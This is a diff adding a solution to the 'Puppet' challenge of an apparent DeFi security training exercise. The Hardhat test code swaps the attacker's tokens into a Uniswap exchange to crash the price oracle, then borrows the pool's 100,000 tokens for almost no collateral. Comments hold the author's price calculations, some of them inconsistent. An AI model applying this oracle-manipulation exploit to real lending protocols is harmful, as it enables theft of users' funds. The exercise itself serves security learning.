@@ -103,6 +103,74 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /**
+         * I guess it has something to do with the _computeOraclePrice and calculateDepositRequired in puppetpool
+         * calculateDepositRequired
+         * -borrowedamount * _computeOraclePrice * 2/10 ** 18
+         * _computeOraclePrice
+         * -uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+         *  
+         * Manipulating the pool i guess 
+         * If i trade in all my token for eth , this lowers decreases the balance of the uniswap  and increases the no of token thus reducing the computerOracle Price
+         * Directly interact with the contract
+         * 
+         * Need to steal 100000 DVT tkns
+         * 
+         * calculating all the prices
+         * // Sell ERC20 for ETH
+            const inputAmount = userInputTokenValue (1000)
+            const inputReserve = tokenContract.methods.balanceOf(exchangeAddress).call() theres 10 dvt here
+            const outputReserve = web3.eth.getBalance(exchangeAddress) 10 eth here
+
+            // Output amount bought
+            const numerator = inputAmount * outputReserve * 997 = 99970000
+            const denominator = inputReserve * 1000 + inputAmount * 997 = 1007000
+            const outputAmount = numerator / denominator = 99.275
+
+            Eth_pool = 0.0098307
+            DVT_POOl = 1010
+
+            price of token = 0.0099307 /1010 = 0.00000983237 eth
+            you want 100000 tokens 
+            100000* 0.0000099307 * 2 = 1.966475  eth is enough
+         * 
+         */
+
+        /**
+         * What to learn? 
+         * Need to learn about Uniswap contract 
+         * Automated market maker of x*y = k, so if more tokens the cheaper it is.
+         * liquidity provider fee of 0.3%
+         * -What are deadlines in uniswap contract?
+         *  - Transaction deadlines sets a time after which a transaction can no longer be executed
+         *  - This limits miners holding signed transactions for exteneded durations and executing them based on market movements
+         *  - It also reduces uncertainty around transactions that take a long time to execute due to issues with gas prices
+         * Deadlines are calculated by adding the desired amount of time (in seconds) to the latest Ethereum block timestamp
+         * Introduction to swaps
+         * https://docs.uniswap.org/concepts/protocol/swaps
+         * Input - amount sold 
+         * Output - amount bought
+         */
+
+        //Exchanging all my tokens for every eth in the exchange 
+
+        //Pretty sure i need to approve the transaction
+        this.token.approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        //tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline)
+        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+        const tx = await this.uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, deadline);
+        // const RPC = "RPC_OF_THE_NETWORK";
+        // const blockNumber = 1; // number of the block you want to get timestamp of
+        // const provider = new ethers.providers.JsonRpcProvider(RPC)
+
+        // const timestamp = (await provider.getBlock(blockNumber)).timestamp;
+        const AttackPool = await this.lendingPool.connect(attacker);
+        //The borrowing price should be 0
+        const attackBal = await ethers.provider.getBalance(attacker.address);
+        //100000
+        await AttackPool.borrow(ethers.utils.parseEther(`100000`),{value:attackBal.sub(ethers.utils.parseEther("1"))});
+
     });
 
     after(async function () {
